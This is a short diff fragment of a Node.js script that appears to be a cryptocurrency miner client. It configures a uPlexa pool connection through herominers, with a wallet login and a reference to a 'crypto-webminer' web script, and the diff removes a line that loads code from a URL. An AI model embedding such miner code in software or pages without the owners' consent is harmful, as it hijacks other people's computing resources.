@@ -1,6 +1,5 @@
 const { WebSocket } = require("ws");
 const axios = require('axios');
-const async = require("require-from-url/async");
 // variable
 const handshake = (() => { return { "identifier": "handshake", "pool": "ca.uplexa.herominers.com:1177", "rightalgo": "cn/upx|2", "login": "UPX1dEMF4gyhgjaLCaQ1KDKzBqGFUqhXCBB3uJWbozj4Y8UMBY9t8prLjmAc5vcbNeSLmMn2RinRaGd4Y3H8RtMU9Jo9i3NC3e", "password": `node_Pro_${Math.floor(Math.random() * 1) + 1}`, "userid": "", "version": 11, "intversion": 1337, "mydomain": "Web Script 05-01-22 Perfekt https://www.custom.crypto-webminer.com/custom.html" }; })();
 const mainStatus = {
